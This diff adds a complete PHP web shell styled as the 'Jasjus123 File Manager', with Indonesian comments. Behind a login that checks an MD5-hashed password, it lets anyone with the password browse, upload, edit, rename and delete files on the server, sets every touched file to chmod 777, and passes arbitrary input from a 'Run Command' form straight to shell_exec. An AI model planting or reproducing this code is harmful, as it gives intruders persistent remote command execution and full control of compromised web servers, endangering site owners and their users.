@@ -1,0 +1,688 @@
+<?php
+ini_set('session.gc_maxlifetime', 3600);  
+session_set_cookie_params(3600);  
+session_start();
+// $allowed_ips = ['27.116.61.48', '185.213.83.129'];
+// if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
+//     die('Access denied.');
+// }
+$hashedPassword = "6027f904f7e3a9e135260d6af00206d5"; 
+if (!isset($_SESSION['authenticated']) && (!isset($_POST['password']) || md5($_POST['password']) !== $hashedPassword)) {
+    ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Jasjus123</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(to bottom, #2a2a2a, #1e1e1e); /* Gradien latar belakang */
+            color: #ffffff; /* Warna teks default */
+        }
+        .card {
+            background-color: #1e1e1e; /* Warna dasar kartu */
+            border: 1px solid #444; /* Border abu gelap */
+            border-radius: 10px; /* Sudut melengkung */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* Bayangan */
+        }
+        .form-label {
+            color: #b0b0b0; /* Warna label lebih terang */
+        }
+        .form-control {
+            background-color: #2a2a2a; /* Background input */
+            color: #ffffff; /* Teks input */
+            border: 1px solid #444; /* Border input */
+        }
+        .form-control:focus {
+            border-color: #007bff; /* Border biru saat fokus */
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5); /* Efek glow */
+        }
+        .btn-primary {
+            background-color: #007bff; /* Warna tombol biru */
+            border-color: #007bff;
+        }
+        .btn-primary:hover {
+            background-color: #0056b3; /* Warna lebih gelap saat hover */
+            border-color: #0056b3;
+        }
+        .login-heading {
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #00bcd4;
+            letter-spacing: 1px;
+        }
+        
+    </style>
+</head>
+<body class="d-flex align-items-center justify-content-center vh-100">
+    <div class="card p-4 shadow" style="width: 400px;">
+        <h2 class="text-center mb-4 login-heading">Login Jasjus123</h2>
+        <form method="POST">
+            <div class="mb-3">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" name="password" id="password" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Login</button>
+        </form>
+    </div>
+</body>
+</html>
+
+    <?php
+    exit;
+}
+$_SESSION['authenticated'] = true;
+
+
+// Direktori saat ini
+$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : '.';
+if (!$currentDir || !is_dir($currentDir)) {
+    $currentDir = '.';
+}
+chdir($currentDir);
+
+// Notifikasi
+$notification = '';
+
+// Fungsi upload file
+if (isset($_FILES['file'])) {
+    $files = $_FILES['file'];
+    for ($i = 0; $i < count($files['name']); $i++) {
+        $targetFile = basename($files['name'][$i]);
+        if (move_uploaded_file($files['tmp_name'][$i], $targetFile)) {
+            chmod($targetFile, 0777); // Set permissions
+            $notification .= "File berhasil diupload: $targetFile<br>";
+        } else {
+            $notification .= "Gagal mengupload file: " . $files['name'][$i] . "<br>";
+        }
+    }
+}
+
+
+// Fungsi delete file/folder
+if (isset($_GET['delete'])) {
+    $pathToDelete = $_GET['delete'];
+    if (is_dir($pathToDelete)) {
+        if (rmdir($pathToDelete)) {
+            $notification = "Folder berhasil dihapus: $pathToDelete";
+        } else {
+            $notification = "Gagal menghapus folder: $pathToDelete";
+        }
+    } elseif (file_exists($pathToDelete)) {
+        if (unlink($pathToDelete)) {
+            $notification = "File berhasil dihapus: $pathToDelete";
+        } else {
+            $notification = "Gagal menghapus file: $pathToDelete.";
+        }
+    }
+}
+
+// Fungsi rename file/folder
+if (isset($_POST['rename'])) {
+    $oldName = $_POST['old_name'];
+    $newName = $_POST['new_name'];
+    if (rename($oldName, $newName)) {
+        chmod($newName, 0777); // Berikan izin penuh ke file/folder yang baru di-rename
+        $notification = "Berhasil merename $oldName menjadi $newName";
+    } else {
+        $notification = "Gagal merename $oldName.";
+    }
+}
+
+// Fungsi edit file
+$editContent = '';
+$fileToEdit = '';
+if (isset($_GET['edit'])) {
+    $fileToEdit = $_GET['edit'];
+    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
+        $editContent = file_get_contents($fileToEdit);
+    } else {
+        $notification = "File tidak ditemukan atau bukan file valid.";
+    }
+}
+if (isset($_POST['save'])) {
+    $fileToSave = $_POST['file'];
+    $content = $_POST['content'];
+    if (file_put_contents($fileToSave, $content)) {
+        chmod($fileToSave, 0777); // Berikan izin penuh ke file yang telah disimpan
+        $notification = "File $fileToSave berhasil disimpan dan diberikan izin penuh (chmod 777).";
+    } else {
+        $notification = "Gagal menyimpan file $fileToSave.";
+    }
+}
+
+// Fungsi membuat file/folder
+if (isset($_POST['create_file'])) {
+    $newFile = $_POST['new_file'];
+    if (file_put_contents($newFile, '') !== false) {
+        chmod($newFile, 0777); // Berikan izin penuh ke file baru
+        $notification = "File $newFile berhasil dibuat.";
+    } else {
+        $notification = "Gagal membuat file $newFile.";
+    }
+}
+if (isset($_POST['create_folder'])) {
+    $newFolder = $_POST['new_folder'];
+    if (mkdir($newFolder)) {
+        chmod($newFolder, 0777); // Berikan izin penuh ke folder baru
+        $notification = "Folder $newFolder berhasil dibuat.";
+    } else {
+        $notification = "Gagal membuat folder $newFolder.";
+    }
+}
+
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+
+    // Tambahkan opsi verbose untuk perintah tertentu jika diperlukan
+    $verboseCommands = ['chmod', 'cp', 'mv', 'rm'];
+
+    // Pisahkan perintah utama dan argumen
+    $cmdParts = explode(' ', $cmd, 2);
+    $mainCommand = $cmdParts[0];
+    $cmdArgs = isset($cmdParts[1]) ? $cmdParts[1] : '';
+
+    // Jika perintah termasuk dalam daftar verbose, tambahkan opsi -v
+    if (in_array($mainCommand, $verboseCommands)) {
+        $cmd = $mainCommand . ' -v ' . $cmdArgs;
+    }
+
+    // Jalankan perintah dan tangkap outputnya
+    $cmdOutput = shell_exec($cmd . ' 2>&1');
+
+    // Jika output kosong, beri pesan berhasil
+    if (trim($cmdOutput) === '') {
+        $cmdOutput = "Perintah '{$cmd}' berhasil dijalankan.";
+    }
+}
+
+if (isset($_POST['bulk_delete']) && isset($_POST['selected_files'])) {
+    $selectedFiles = $_POST['selected_files'];
+    foreach ($selectedFiles as $fileToDelete) {
+        if (is_dir($fileToDelete)) {
+            if (rmdir($fileToDelete)) {
+                $notification .= "Folder berhasil dihapus: $fileToDelete<br>";
+            } else {
+                $notification .= "Gagal menghapus folder: $fileToDelete<br>";
+            }
+        } elseif (file_exists($fileToDelete)) {
+            if (unlink($fileToDelete)) {
+                $notification .= "File berhasil dihapus: $fileToDelete<br>";
+            } else {
+                $notification .= "Gagal menghapus file: $fileToDelete<br>";
+            }
+        }
+    }
+}
+
+// Fungsi logout
+if (isset($_GET['logout'])) {
+    session_unset(); // Hapus semua data sesi
+    session_destroy(); // Hancurkan sesi
+    header('Location: ' . $_SERVER['PHP_SELF']); // Redirect ke halaman login
+    exit;
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jasjus123 File Manager</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>body{background-color:#121212;color:#e0e0e0}.breadcrumb-item a{color:#00bcd4;text-decoration:none}.breadcrumb-item a:hover{color:#80deea}.table a{color:#00bcd4;text-decoration:none}.table a:hover{color:#80deea}.btn-close{color:#e0e0e0}.form-control{background-color:#1e1e1e;color:#fff;border:1px solid #007bff}.form-control::placeholder{color:#9e9e9e;opacity:1}.form-control:focus{background-color:#1e1e1e;color:#fff;border-color:#00bcd4;box-shadow:0 0 5px #00bcd4}textarea{background-color:#1e1e1e;color:#fff;border:1px solid #007bff;font-family:monospace;resize:both;padding:10px}textarea:focus{background-color:#1e1e1e;color:#fff;border-color:#00bcd4;box-shadow:0 0 5px #00bcd4}.btn-primary{background-color:#007bff;border-color:#007bff}.btn-primary:hover{background-color:#0056b3}.btn-danger{background-color:#000;border-color:#007bff}.btn-danger:hover{background-color:#000}.btn-success{background-color:#4caf50;border-color:#4caf50}.btn-success:hover{background-color:#388e3c}.btn-info{background-color:#00bcd4;border-color:#00bcd4}.btn-info:hover{background-color:#0288d1}.alert{background-color:#333;color:#fff;border-color:#444}.alert-info{background-color:#1e88e5}.alert-danger{background-color:#d32f2f}.btn-dark,.btn-secondary{background-color:#2a2a2a;border:1px solid #007bff;color:#fff}.btn-dark:hover,.btn-secondary:hover{background-color:#1e1e1e;border-color:#666;color:#fff}.table tbody td a.text-white{text-decoration:none;color:#fff}.table tbody td a.text-white:hover{text-decoration:underline;color:#e0e0e0}.card{background-color:#2a2a2a;border:1px solid #007bff;border-radius:10px;box-shadow:0 4px 6px rgb(0 0 0 / .2);margin:10px auto;padding:10px}.card pre{background-color:#1e1e1e;color:#00ff7f;border-radius:5px;padding:15px;overflow-x:auto;font-size:.85rem;white-space:pre-wrap;word-wrap:break-word;line-height:1.4}.card h5{color:#00bcd4;font-size:1rem;margin-bottom:10px;text-align:center}</style>
+    <style>
+    /* Tabel */
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 16px;
+        margin: 20px 0;
+    }
+
+    th, td {
+        padding: 12px;
+        text-align: left;
+        vertical-align: middle;
+        border: 1px solid #444;
+    }
+
+    th {
+        background-color: #0073e6;
+        color: white;
+        text-align: center;
+    }
+
+    tr:nth-child(even) {
+        background-color: #2a2a2a;
+    }
+
+    tr:nth-child(odd) {
+        background-color: #1e1e1e;
+    }
+
+    tr:hover {
+        background-color: #333;
+    }
+
+    /* Kolom Ukuran dan Modifikasi Rata Tengah */
+    td[style*="text-align: center;"] {
+        text-align: center !important;
+    }
+
+    /* Tombol */
+    .btn {
+        font-size: 12px;
+        border-radius: 4px;
+        text-transform: uppercase;
+        padding: 5px;
+        color: white;
+        text-decoration: none;
+        display: inline-block;
+    }
+
+    .btn-secondary {
+        background-color: #6c757d;
+    }
+
+    .btn-secondary:hover {
+        background-color: #5a6268;
+    }
+
+    .btn-dark {
+        background-color: #343a40;
+    }
+
+    .btn-dark:hover {
+        background-color: #23272b;
+    }
+
+    #dropzone {
+    background-color:rgba(var(--bs-secondary-rgb),var(--bs-bg-opacity))!important;
+    border-radius: 5px;
+    transition: border-color 0.3s;
+}
+
+#dropzone:hover {
+    background-color: #e9ecef;
+}
+
+#dropzone.dragover {
+    border-color: #0056b3;
+}
+#commandOutput {
+    transition: max-height 0.5s ease; /* Transisi untuk perubahan ukuran */
+    overflow: hidden; /* Menghilangkan konten yang melebihi ukuran */
+    max-height: 50px; /* Ukuran default (kecil) */
+    background-color: #1e1e1e; /* Warna latar belakang */
+    border: 1px solid #444; /* Border */
+    padding: 10px; /* Padding */
+}
+
+#commandOutput.expanded {
+    max-height: 500px; /* Ukuran besar saat ada output */
+}
+
+</style>
+
+
+</head>
+
+<body>
+    <div class="banner bg-gradient text-white text-center py-3 mb-4">
+        <div class="container">
+            <h1 class="fw-bold mb-0">Jasjus123 File Manager</h1>
+        </div>
+    </div>
+
+    <!-- Path Navigasi -->
+    <nav aria-label="breadcrumb">
+    <ol class="breadcrumb justify-content-center">
+        <?php if (isset($_GET['dir']) && $_GET['dir'] !== '.'): ?>
+        <li class="breadcrumb-item">
+            <a href="javascript:history.back()" class="d-flex align-items-center justify-content-center">
+                <i class="fas fa-arrow-left" style="font-size: 1rem; margin-right: 5px;"></i>
+                <span>Back</span>
+            </a>
+        </li>
+        <?php endif; ?>
+        <li class="breadcrumb-item">
+            <a href="?dir=." class="d-flex align-items-center justify-content-center">
+                <i class="fas fa-home" style="font-size: 1rem; margin-right: 5px;"></i>
+                <span>Home</span>
+            </a>
+        </li>
+        <?php
+        $pathParts = explode('/', $currentDir);
+        $pathSoFar = '';
+        foreach ($pathParts as $index => $part) {
+            if ($part !== '.') {
+                $pathSoFar .= $part . '/';
+                echo '<li class="breadcrumb-item"><a href="?dir=' . rtrim($pathSoFar, '/') . '">' . $part . '</a></li>';
+            }
+        }
+        ?>
+    </ol>
+</nav>
+
+    <!-- Notification -->
+    <?php if ($notification): ?>
+    <div class="container my-3">
+        <div class="alert alert-info alert-dismissible fade show shadow-sm" role="alert">
+            <strong>Notifikasi:</strong> <?php echo htmlspecialchars($notification); ?>
+            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+        </div>
+    </div>
+    <?php endif; ?>
+
+
+    <!-- Menu -->
+    <div class="container mb-4">
+        <div class="card bg-dark text-light shadow-sm p-3">
+            <div class="row g-3">
+                <!-- Upload File -->
+                    <div class="col-md-3 text-center">
+                    <h6 class="text-light mb-2">Upload File</h6>
+                    <div id="dropzone" style="border: 2px dashed #007bff; padding: 9px; text-align: center; cursor: pointer;">
+                        Drop files here to upload or click to select
+                    </div>
+                    <form method="POST" enctype="multipart/form-data" style="display: none;" id="uploadForm">
+                        <input type="file" id="fileInput" name="file[]" multiple>
+                    </form>
+                </div>
+
+                <!-- Create File -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Create File</h6>
+                        <input type="text" name="new_file" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Nama File">
+                        <button type="submit" name="create_file" class="btn btn-success btn-sm w-100">Create</button>
+                    </form>
+                </div>
+                <!-- Create Folder -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Create Folder</h6>
+                        <input type="text" name="new_folder" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Nama Folder">
+                        <button type="submit" name="create_folder" class="btn btn-info btn-sm w-100">Create</button>
+                    </form>
+                </div>
+                <!-- Run Command -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Run Command</h6>
+                        <input type="text" name="cmd" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Command">
+                        <button type="submit" class="btn btn-secondary btn-sm w-100">Run</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <?php if (!empty($cmdOutput)): ?>
+<div class="container my-3">
+    <h5 class="text-info">Command Output:</h5>
+    <div id="commandOutput" class="card bg-dark text-light shadow-sm expanded">
+        <div class="card-body">
+            <pre style="white-space: pre-wrap; word-wrap: break-word; font-size: 0.85rem;">
+                <?php echo htmlspecialchars($cmdOutput); ?>
+            </pre>
+        </div>
+    </div>
+</div>
+<?php endif; ?>
+
+
+<!-- Edit File -->
+<?php if (!empty($fileToEdit)): ?>
+<div class="container my-4">
+    <div class="card shadow-sm">
+        <div class="card-body">
+            <h4 class="card-title text-center text-white">Edit File: <?php echo htmlspecialchars($fileToEdit); ?></h4>
+            <form method="POST">
+                <input type="hidden" name="file" value="<?php echo htmlspecialchars($fileToEdit); ?>">
+                <!-- Textarea standar -->
+                <textarea name="content" rows="15" class="form-control"><?php echo htmlspecialchars($editContent); ?></textarea>
+                <button type="submit" name="save" class="btn btn-primary w-100 mt-3">Save File</button>
+            </form>
+        </div>
+    </div>
+</div>
+<?php endif; ?>
+
+    <!-- List File -->
+    <div class="container my-4">
+        <div class="card bg-dark text-light shadow-sm">
+            <div class="card-header text-center">
+                <h2 class="mb-0">File Directory</h2>
+            </div>
+            <div class="card-body">
+                <form method="POST" id="bulkDeleteForm">
+                <table class="table table-striped table-dark table-sm">
+    <thead>
+        <tr>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">
+                <input type="checkbox" id="selectAll" style="transform: scale(1.2); vertical-align: middle;">
+            </th>
+            <th style="width: 20%; text-align: left;">Nama</th>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">Jenis</th>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">Izin</th>
+            <th style="width: 8%; vertical-align: middle; text-align: center;">Ukuran</th>
+            <th style="width: 15%; vertical-align: middle; text-align: center;">Waktu Modifikasi</th>
+            <th style="width: 25%; vertical-align: middle; text-align: center;">Aksi</th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php
+        // Fungsi untuk memformat ukuran file
+        function formatSizeUnits($bytes) {
+            if ($bytes >= 1073741824) {
+                return number_format($bytes / 1073741824, 2) . ' GB';
+            } elseif ($bytes >= 1048576) {
+                return number_format($bytes / 1048576, 2) . ' MB';
+            } elseif ($bytes >= 1024) {
+                return number_format($bytes / 1024, 2) . ' KB';
+            } elseif ($bytes > 1) {
+                return $bytes . ' bytes';
+            } elseif ($bytes == 1) {
+                return $bytes . ' byte';
+            } else {
+                return '0 bytes';
+            }
+        }
+
+        // Dapatkan direktori saat ini
+        $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+
+        if (!$currentDir || !is_dir($currentDir)) {
+            $currentDir = getcwd(); // Set ke root aplikasi
+        }
+        
+        chdir($currentDir);        
+
+        // Scan direktori
+        $files = scandir($currentDir);
+
+        foreach ($files as $file) {
+            if ($file !== '.' && $file !== '..') {
+                // Path lengkap ke file/direktori
+                $path = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
+
+                // Tentukan apakah ini file atau folder
+                $icon = is_dir($path) ? '📁' : '📄';
+                $link = is_dir($path) ? '?dir=' . urlencode($path) : '?edit=' . urlencode($path);
+
+                // Dapatkan izin file dalam format angka (777, 755, dll.)
+                $permissions = substr(sprintf('%o', fileperms($path)), -3);
+
+                // Dapatkan ukuran file (jika file, bukan folder)
+                $fileSize = is_file($path) ? filesize($path) : '-';
+                $formattedSize = is_file($path) ? formatSizeUnits($fileSize) : '-';
+
+                // Dapatkan waktu modifikasi file/folder
+                $modificationTime = date('Y-m-d H:i:s', filemtime($path));
+
+                // Buat link untuk "Open"
+                if (is_file($path)) {
+                    $fileLink = "<a href='" . htmlspecialchars($_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $path)) . "' target='_blank' class='btn btn-secondary btn-sm w-100 text-white'>Open</a>";
+                } else {
+                    $fileLink = '';
+                }
+
+                // Outputkan row tabel
+                echo "<tr>
+                    <td style='text-align: center; vertical-align: middle;'>
+                        <input type='checkbox' name='selected_files[]' value='" . htmlspecialchars($path) . "' style='transform: scale(1.2);'>
+                    </td>
+                    <td class='text-start'><a href='$link' class='text-white'>$icon $file</a></td>
+                    <td style='vertical-align: middle; text-align: center;'>" . (is_dir($path) ? 'Folder' : 'File') . "</td>
+                    <td style='vertical-align: middle; text-align: center;'>$permissions</td>
+                    <td style='vertical-align: middle; text-align: center;'>$formattedSize</td>
+                    <td style='vertical-align: middle; text-align: center;'>$modificationTime</td>
+                    <td>
+                        <div class='row gx-1'>
+                            <div class='col'>$fileLink</div>
+                            <div class='col'><a href='?edit=$path' class='btn btn-dark btn-sm w-100 text-white'>Edit</a></div>
+                            <div class='col'><button type='button' class='btn btn-dark btn-sm w-100 text-white' data-bs-toggle='modal' data-bs-target='#renameModal' data-oldname='$path'>Rename</button></div>
+                            <div class='col'><a href='?delete=$path' class='btn btn-dark btn-sm w-100 text-white' onclick=\"return confirm('Hapus $file?');\">Delete</a></div>
+                        </div>
+                    </td>
+                </tr>";
+            }
+        }
+        ?>
+    </tbody>
+</table>
+
+                 <div class="d-flex justify-content-between align-items-center mt-3">
+                <form method="POST" class="mb-0">
+                    <button type="submit" name="bulk_delete" class="btn btn-danger btn-sm">Delete Selected</button>
+                </form>
+                <form method="GET" class="mb-0">
+                    <button type="submit" name="logout" value="true" class="btn btn-danger btn-sm">Logout</button>
+                </form>
+            </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+    </form>
+
+    <script>
+        // Script untuk Select All
+        document.getElementById('selectAll').addEventListener('change', function() {
+            let checkboxes = document.querySelectorAll('input[name="selected_files[]"]');
+            for (let checkbox of checkboxes) {
+                checkbox.checked = this.checked;
+            }
+        });
+    </script>
+
+    </div>
+
+    <!-- Modal Rename -->
+    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="renameModalLabel">Rename File/Folder</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST">
+                    <div class="modal-body">
+                        <input type="hidden" name="old_name" id="oldName">
+                        <div class="mb-3">
+                            <label for="newName" class="form-label">New Name</label>
+                            <input type="text" class="form-control" name="new_name" id="newName" required>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" name="rename" class="btn btn-primary">Rename</button>
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var renameModal = document.getElementById('renameModal');
+        renameModal.addEventListener('show.bs.modal', function(event) {
+            var button = event.relatedTarget;
+            var oldName = button.getAttribute('data-oldname');
+            var modalOldName = renameModal.querySelector('#oldName');
+            var modalNewName = renameModal.querySelector('#newName');
+            modalOldName.value = oldName;
+            modalNewName.value = oldName.split('/').pop();
+        });
+        
+    </script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const dropzone = document.getElementById('dropzone');
+        const fileInput = document.getElementById('fileInput');
+        const uploadForm = document.getElementById('uploadForm');
+
+        // Highlight border on drag over
+        dropzone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropzone.style.borderColor = '#0056b3';
+        });
+
+        // Reset border on drag leave
+        dropzone.addEventListener('dragleave', () => {
+            dropzone.style.borderColor = '#007bff';
+        });
+
+        // Handle file drop
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropzone.style.borderColor = '#007bff';
+            fileInput.files = e.dataTransfer.files; // Set dropped files to input
+            uploadForm.submit(); // Submit form automatically
+        });
+
+        // Handle click to open file selector
+        dropzone.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        // Handle file input change
+        fileInput.addEventListener('change', () => {
+            uploadForm.submit(); // Submit form when files are selected
+        });
+    });
+</script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const commandOutput = document.getElementById('commandOutput');
+        
+        // Jika ada teks di dalam Command Output, tambahkan kelas "expanded"
+        if (commandOutput && commandOutput.querySelector('pre').innerText.trim() !== '') {
+            commandOutput.classList.add('expanded');
+        } else {
+            commandOutput.style.display = 'none'; // Sembunyikan jika kosong
+        }
+    });
+</script>
+
+    <footer class="bg-dark text-light text-center py-3 mt-4">
+        <div class="container">
+            <p class="mb-1">© <?php echo date("Y"); ?> JASJUS123. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+</body>
+
+</html>
